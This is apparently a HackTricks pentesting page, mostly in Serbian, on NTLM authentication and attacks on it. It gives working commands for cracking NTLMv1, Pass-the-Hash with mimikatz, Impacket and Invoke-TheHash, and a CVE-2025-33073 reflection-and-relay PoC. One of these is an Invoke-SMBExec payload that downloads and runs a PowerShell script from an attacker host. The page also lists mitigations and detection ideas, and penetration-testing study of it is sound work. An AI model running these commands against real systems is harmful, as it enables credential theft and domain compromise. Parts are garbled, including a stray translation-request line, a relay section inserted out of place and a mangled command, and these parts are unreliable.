# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Osnovne informacije

U okruženjima gde su **Windows XP i Server 2003** u upotrebi, koriste se LM (Lan Manager) hash-evi, iako je opšte poznato da se oni lako kompromituju. Određeni LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, ukazuje na scenario u kome se LM ne koristi, predstavljajući hash za prazan string.

Podrazumevano, **Kerberos** authentication protocol je primarni metod koji se koristi. NTLM (NT LAN Manager) stupa na snagu u određenim situacijama: kada nema Active Directory, kada domain ne postoji, kada Kerberos ne radi zbog nepravilne konfiguracije, ili kada se veze pokušavaju uspostaviti korišćenjem IP adrese umesto validnog hostname.

Prisustvo zaglavlja **"NTLMSSP"** u network packets signalizira NTLM authentication process.

Podrška za authentication protocols - LM, NTLMv1, i NTLMv2 - obezbeđena je putem određene DLL biblioteke koja se nalazi na `%windir%\Windows\System32\msv1\_0.dll`.

**Ključne tačke**:

- LM hash-evi su ranjivi i prazan LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) označava da se ne koristi.
- Kerberos je podrazumevani authentication method, dok se NTLM koristi samo u određenim uslovima.
- NTLM authentication packets se prepoznaju po zaglavlju "NTLMSSP".
- LM, NTLMv1, i NTLMv2 protokoli su podržani od strane sistemske datoteke `msv1\_0.dll`.

## LM, NTLMv1 and NTLMv2

Možete proveriti i podesiti koji će se protocol koristiti:

### GUI

Pokrenite _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Postoji 6 nivoa (od 0 do 5).

![](<../../images/image (919).png>)

### Registry

Ovo će postaviti nivo 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Moguće vrednosti:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Basic NTLM Domain authentication Scheme

1. **user** unosi svoje **credentials**
2. client machine **šalje authentication request** sa **domain name** i **username**
3. **server** šalje **challenge**
4. **client encrypts** **challenge** using the hash of the password as key and sends it as response
5. **server šalje** ka **Domain controller** **domain name, username, challenge i response**. If **nema** Active Directory konfigurisan ili je domain name ime servera, credentials se **proveravaju lokalno**.
6. **domain controller checks if everything is correct** i šalje informacije serveru

**server** i **Domain Controller** mogu da kreiraju **Secure Channel** preko **Netlogon** servera pošto Domain Controller zna password servera (on je unutar **NTDS.DIT** db).

### Local NTLM authentication Scheme

authentication je kao ona pomenuta **pre, ali** **server** zna **hash of the user** koji pokušava da se autentifikuje unutar **SAM** fajla. Dakle, umesto da pita Domain Controller, **server će sam proveriti** da li user može da se autentifikuje.

### NTLMv1 Challenge

**challenge length is 8 bytes** i **response is 24 bytes** long.

**hash NT (16bytes)** je podeljen na **3 parts of 7bytes each** (7B + 7B + (2B+0x00\*5)): **last part is filled with zeros**. Zatim se **challenge** **ciphered separately** sa svakim delom i **resulting** ciphered bytes se **spajaju**. Total: 8B + 8B + 8B = 24Bytes.

**Problems**:

- Lack of **randomness**
- 3 parts can be **attacked separately** to find NT hash
- **DES is crackable**
- 3º key is composed always by **5 zeros**.
- Given the **same challenge** the **response** will be **same**. So, you can give as a **challenge** to the victim the string "**1122334455667788**" and attack the response used **precomputed rainbow tables**.

### NTLMv1 attack

Nowadays is becoming less common to find environments with Unconstrained Delegation configured, but this doesn't mean you can't **abuse a Print Spooler service** configured.

You could abuse some credentials/sessions you already have on the AD to **ask the printer to authenticate** against some **host under your control**. Then, using `metasploit auxiliary/server/capture/smb` or `responder` you can **set the authentication challenge to 1122334455667788**, capture the authentication attempt, and if it was done using **NTLMv1** you will be able to **crack it**.\
If you are using `responder` you could try to **use the flag `--lm`** to try to **downgrade** the **authentication**.\
_Note that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._

Remember that the printer will use the computer account during the authentication, and computer accounts use **long and random passwords** that you **probably won't be able to crack** using common **dictionaries**. But the **NTLMv1** authentication **uses DES** ([more info here](#ntlmv1-challenge)), so using some services specially dedicated to cracking DES you will be able to crack it (you could use [https://crack.sh/](https://crack.sh) or [https://ntlmv1.com/](https://ntlmv1.com) for example).

### NTLMv1 attack with hashcat

NTLMv1 can also be broken with the NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) which formats NTLMv1 messages im a method that can be broken with hashcat.

The command
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
izbacilo bi sledeće:
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the file contents you want translated.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Pokrenite hashcat (distribuirano je najbolje preko alata kao što je hashtopolis) jer će u suprotnom ovo trajati nekoliko dana.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
U ovom slučaju znamo da je lozinka za ovo `password`, pa ćemo varati u svrhu demonstracije:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Sada treba da koristimo hashcat-utilities da konvertujemo cracked des ključeve u delove NTLM hash-a:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Na kraju, poslednji deo:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
## NTLM Relay

NTLM Relay je tehnika koja omogućava napadaču da prosledi NTLM autentifikaciju jednog korisnika ka drugom servisu, čime se često dobija neovlašćen pristup ili eskalacija privilegija. U praksi, napadač presreće NTLM handshake i prosleđuje ga na ciljnu uslugu koja prihvata NTLM autentifikaciju.

Ova tehnika se često koristi zajedno sa drugim napadima, kao što su SMB relay, HTTP relay, LDAP relay i coerced authentication, kako bi se napadač naveo da autentifikaciju pošalje na kontrolisani server.

### Kako funkcioniše

1. Žrtva pokušava da se autentifikuje na napadačev server.
2. Napadač hvata NTLM challenge-response tok.
3. Napadač prosleđuje autentifikaciju ka drugom servisu.
4. Ako servis ne koristi odgovarajuće zaštite, autentifikacija uspeva.

### Uobičajene zaštite

- Potpisivanje SMB poruka
- LDAP signing
- Channel binding
- Extended Protection for Authentication
- Onemogućavanje NTLM gde je moguće

### Relevantni napadi

- SMB relay
- HTTP relay
- LDAP relay
- coerced authentication

### Napomena

NTLM Relay je posebno efikasan kada ciljni servis ne zahteva dodatne zaštite i kada je NTLM i dalje omogućen u okruženju.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Dužina challenge-a je 8 bajtova** i šalju se **2 odgovora**: jedan je dug **24 bajta**, a dužina **drugog** je **promenljiva**.

**Prvi odgovor** se kreira šifrovanjem pomoću **HMAC_MD5** **stringa** sastavljenog od **client i domain** i korišćenjem **hash MD4** od **NT hash** kao **ključem**. Zatim će se **rezultat** koristiti kao **ključ** za šifrovanje **challenge-a** pomoću **HMAC_MD5**. Ovome se dodaje **client challenge od 8 bajtova**. Ukupno: 24 B.

**Drugi odgovor** se kreira korišćenjem **više vrednosti** (novi client challenge, **timestamp** da bi se izbegli **replay attacks**...)

Ako imate **pcap** koji je snimio uspešan proces autentifikacije, možete pratiti ovaj vodič da biste dobili domain, username, challenge i response i pokušali da crackujete password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

## Pass-the-Hash

**Jednom kada imate hash žrtve**, možete ga koristiti da je **impersonate**-ujete.\
Morate koristiti **alat** koji će **izvršiti** **NTLM authentication using** taj hash, **ili** možete kreirati novi **sessionlogon** i **inject**-ovati taj hash unutar **LSASS**, tako da kada se izvrši bilo koja **NTLM authentication**, taj hash će biti korišćen. Poslednja opcija je ono što radi mimikatz.

**Imajte na umu da Pass-the-Hash napade možete izvoditi i koristeći Computer accounts.**

### **Mimikatz**

**Mora da se pokrene kao administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Ovo će pokrenuti proces koji će pripadati korisnicima koji su pokrenuli mimikatz, ali interno u LSASS-u sačuvani kredencijali su oni unutar mimikatz parametara. Zatim, možete pristupiti mrežnim resursima kao da ste taj korisnik (slično `runas /netonly` triku, ali ne morate znati plain-text password).

### Pass-the-Hash from linux

Možete dobiti code execution na Windows mašinama koristeći Pass-the-Hash iz Linuxa.\
[**Pristupite ovde da naučite kako da to uradite.**](https://github.com/carlospolop/hacktricks/blob/master/windows/ntlm/broken-reference/README.md)

### Impacket Windows compiled tools

Možete preuzeti [impacket binaries za Windows ovde](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (U ovom slučaju morate da navedete komandu, cmd.exe i powershell.exe nisu validni za dobijanje interaktivne shell sesije)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Postoji još nekoliko Impacket binaries...

### Invoke-TheHash

Možete dobiti powershell skripte odavde: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Ova funkcija je **kombinacija svih ostalih**. Možete proslediti **više hostova**, **isključiti** neke i **izabrati** **opciju** koju želite da koristite (_SMBExec, WMIExec, SMBClient, SMBEnum_). Ako izaberete **bilo koji** od **SMBExec** i **WMIExec**, ali **ne** date nijedan parametar _**Command**_, samo će **proveriti** da li imate **dovoljno dozvola**.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Mora da se pokrene kao administrator**

Ovaj alat će uraditi istu stvar kao mimikatz (modifikuje LSASS memoriju).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ručno Windows remote izvršavanje sa username i password


{{#ref}}
../lateral-movement/
{{#endref}}

## Ekstrakcija credentials sa Windows hosta

**Za više informacija o** [**tome kako da dobiješ credentials sa Windows hosta treba da pročitaš ovu stranicu**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/ntlm/broken-reference/README.md)**.**

## Internal Monologue attack

Internal Monologue Attack je stealthy tehnika za ekstrakciju credentials koja napadaču omogućava da preuzme NTLM hashes sa mašine žrtve **bez direktne interakcije sa LSASS procesom**. Za razliku od Mimikatz-a, koji čita hashes direktno iz memorije i često je blokiran od strane endpoint security rešenja ili Credential Guard-a, ovaj attack koristi **lokalne pozive ka NTLM authentication package (MSV1_0) preko Security Support Provider Interface (SSPI)**. Napadač prvo **downgraduje NTLM podešavanja** (npr. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) kako bi obezbedio da je NetNTLMv1 dozvoljen. Zatim impersonira postojeće user tokene dobijene iz procesa koji se izvršavaju i lokalno pokreće NTLM authentication da bi generisao NetNTLMv1 responses koristeći poznati challenge.

Nakon hvatanja ovih NetNTLMv1 responses, napadač može brzo da povrati originalne NTLM hashes koristeći **precomputed rainbow tables**, što omogućava dalje Pass-the-Hash attacks za lateral movement. Ključno je da Internal Monologue Attack ostaje stealthy zato što ne generiše network traffic, ne injektuje code i ne pokreće direktne memory dumps, pa ga je teže otkriti nego tradicionalne metode kao što je Mimikatz.

Ako NetNTLMv1 nije prihvaćen — zbog primenjenih security policies, napadač možda neće moći da dobije NetNTLMv1 response.

Da bi se ovaj slučaj obradio, alat Internal Monologue je ažuriran: Dinamički preuzima server token koristeći `AcceptSecurityContext()` kako bi i dalje mogao da **uhvati NetNTLMv2 responses** ako NetNTLMv1 ne uspe. Iako je NetNTLMv2 mnogo teži za crackovanje, i dalje otvara put za relay attacks ili offline brute-force u ograničenim slučajevima.

PoC može da se pronađe na **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.

## NTLM Relay i Responder

**Pročitaj detaljniji vodič kako da izvedeš ove attacks ovde:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parsiranje NTLM challenges iz network capture-a

**Možeš da koristiš** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* preko Serialized SPNs (CVE-2025-33073)

Windows sadrži nekoliko mitigations koje pokušavaju da spreče *reflection* attacks gde se NTLM (ili Kerberos) authentication koji potiče sa hosta relays nazad na **isti** host da bi se dobile SYSTEM privilegije.

Microsoft je pokvario većinu javnih chain-ova sa MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) i kasnijim patch-evima, međutim **CVE-2025-33073** pokazuje da zaštite i dalje mogu da se zaobiđu zloupotrebom načina na koji **SMB client truncates Service Principal Names (SPNs)** koji sadrže *marshalled* (serialized) target-info.

### TL;DR bug-a
1. Napadač registruje **DNS A-record** čija labela enkodira marshalled SPN – npr.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Žrtva se coerces da se autentifikuje na taj hostname (PetitPotam, DFSCoerce, itd.).
3. Kada SMB client prosledi target string `cifs/srv11UWhRCAAAAA…` ka `lsasrv!LsapCheckMarshalledTargetInfo`, poziv `CredUnmarshalTargetInfo` **uklanja** serialized blob, ostavljajući **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (ili Kerberos ekvivalent) sada smatra da je target *localhost* zato što kratki deo hosta odgovara imenu računara (`SRV1`).
5. Kao posledicu, server postavlja `NTLMSSP_NEGOTIATE_LOCAL_CALL` i ubacuje **LSASS-ov SYSTEM access-token** u context (za Kerberos se kreira SYSTEM-marked subsession key).
6. Relaying te authentication sa `ntlmrelayx.py` **ili** `krbrelayx.py` daje puna SYSTEM prava na istom hostu.

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Patch & Mitigations
* KB patch za **CVE-2025-33073** dodaje proveru u `mrxsmb.sys::SmbCeCreateSrvCall` koja blokira svaku SMB konekciju čiji target sadrži marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).
* Primenite **SMB signing** da biste sprečili reflection čak i na hostovima bez patch-a.
* Pratite DNS zapise koji liče na `*<base64>...*` i blokirajte coercion vektore (PetitPotam, DFSCoerce, AuthIP...).

### Detection ideas
* Network captures sa `NTLMSSP_NEGOTIATE_LOCAL_CALL` gde je client IP ≠ server IP.
* Kerberos AP-REQ koji sadrži subsession key i client principal jednak hostname-u.
* Windows Event 4624/4648 SYSTEM logons odmah praćene remote SMB writes sa istog hosta.

Za **March 2026** lokalni reflection variant koji zloupotrebljava **SMB arbitrary ports** i **TCP connection reuse** da bi došao do `NT AUTHORITY\SYSTEM`, pogledajte:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
* [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/la-reflexion-ntlm-est-morte-vive-la-reflexion-ntlm-analyse-approfondie-de-la-cve-2025.html)
* [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)

{{#include ../../banners/hacktricks-training.md}}
